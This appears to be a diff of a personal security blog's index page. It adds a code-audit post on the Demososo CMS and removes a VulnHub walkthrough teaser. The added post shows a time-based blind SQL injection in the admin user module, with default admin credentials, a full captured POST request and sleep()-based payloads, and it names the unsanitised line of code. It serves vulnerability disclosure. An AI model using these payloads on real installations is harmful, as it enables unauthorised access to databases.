@@ -330,6 +330,169 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/09/05/Demososo-code-audit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="chessur">
+      <meta itemprop="description" content="Freedom as Autonomy">
+      <meta itemprop="image" content="/images/cat.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Emerald Dream">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/09/05/Demososo-code-audit/" class="post-title-link" itemprop="url">'Demososo-code-audit'</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-09-05 09:27:45 / Modified: 12:43:24" itemprop="dateCreated datePublished" datetime="2019-09-05T09:27:45+08:00">2019-09-05</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h1><p>After install this CMS, enter admin page through /dmqyjz_v20190822/admindm-yourname/g.php</p>
+<p>log in with admin:admin123</p>
+<p>then visit /dmqyjz_v20190822/admindm-yourname/mod_account/mod_user.php?lang=cn</p>
+<p><img src="/2019/09/05/Demososo-code-audit/01.pos.jpg" alt></p>
+<p>Use Burp Suite and set Intercept on to catch this package</p>
+<p><img src="/2019/09/05/Demososo-code-audit/02.burp.jpg" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /dmqyjz_v20190822/admindm-yourname/mod_account/mod_user.php?lang=cn&amp;file=list&amp;act=pos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://localhost/dmqyjz_v20190822/admindm-yourname/mod_account/mod_user.php?lang=cn</span><br><span class="line">Cookie: UM_distinctid=16cfc4a88ff268-067ca10ef68b488-1262694a-1fa400-16cfc4a890029a; CNZZDATA1256279252=1005958402-1567599470-http%253A%252F%252Flocalhost%252F%7C1567599470; usercookie=77-5ed9412c29c00eda8c8eca41483d82f6; isadmin=y; admindir=admindm-yourname; username=admin; PHPSESSID=1sean1pmkvo9o10v44mub0a8b3</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">99=50&amp;Submit=%E6%8E%92%E5%BA%8F</span><br></pre></td></tr></table></figure>
+<p>and send this package to repeater to compare payloads</p>
+<p>Payloads:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99&apos;%09or%09sleep(1)#=50&amp;Submit=%E6%8E%92%E5%BA%8F</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/05/Demososo-code-audit/03.sleep_1.jpg" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99&apos;%09or%09sleep(5)#=50&amp;Submit=%E6%8E%92%E5%BA%8F</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/05/Demososo-code-audit/04.sleep_5.jpg" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99&apos;%09or%09sleep(10)#=50&amp;Submit=%E6%8E%92%E5%BA%8F</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/05/Demososo-code-audit/05.sleep_10.jpg" alt></p>
+<p>there is obvious difference in response time </p>
+<p>so this is SQL injection</p>
+<p><strong>what causes SQL injection</strong></p>
+<p><img src="/2019/09/05/Demososo-code-audit/06.code.jpg" alt></p>
+<p>in /dmqyjz_v20190822/admindm-yourname/mod_account/mod_user.php Line 42 </p>
+<p><code>$v</code> was sent to MySQL directly </p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/09/03/Code-Audit-Basic/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -375,7 +538,7 @@
                 
               
 
-              <time title="Created: 2019-09-03 10:41:57 / Modified: 14:08:31" itemprop="dateCreated datePublished" datetime="2019-09-03T10:41:57+08:00">2019-09-03</time>
+              <time title="Created: 2019-09-03 10:41:57 / Modified: 18:18:50" itemprop="dateCreated datePublished" datetime="2019-09-03T10:41:57+08:00">2019-09-03</time>
             
 
             
@@ -1834,190 +1997,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/05/16/VulnHub-Billu-b0x2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="chessur">
-      <meta itemprop="description" content="Freedom as Autonomy">
-      <meta itemprop="image" content="/images/cat.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Emerald Dream">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/16/VulnHub-Billu-b0x2/" class="post-title-link" itemprop="url">'VulnHub Billu b0x2 Walkthrough'</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-05-16 17:06:46" itemprop="dateCreated datePublished" datetime="2019-05-16T17:06:46+08:00">2019-05-16</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-07-04 18:16:15" itemprop="dateModified" datetime="2019-07-04T18:16:15+08:00">2019-07-04</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/VulnHub/" itemprop="url" rel="index"><span itemprop="name">VulnHub</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="1-Goal"><a href="#1-Goal" class="headerlink" title="1. Goal"></a>1. Goal</h1><p>Machine Name: - Billu_b0x 2</p>
-<p>Author Name: - Manish Kishan Tanwar (@indishell1046)</p>
-<p>This Virtual machine is using ubuntu (32 bit)</p>
-<p>Other packages used: -</p>
-<p>PHP Apache MySQL Apache tomcat</p>
-<p>This virtual machine is having intermediate to medium difficulty level. One need to break into VM using web application and from there escalate privileges to gain root access. Gaining low or root privilege shell can be done in two ways (for both)</p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/05/16/VulnHub-Billu-b0x2/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2066,7 +2045,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">39</span>
+                    <span class="site-state-item-count">40</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
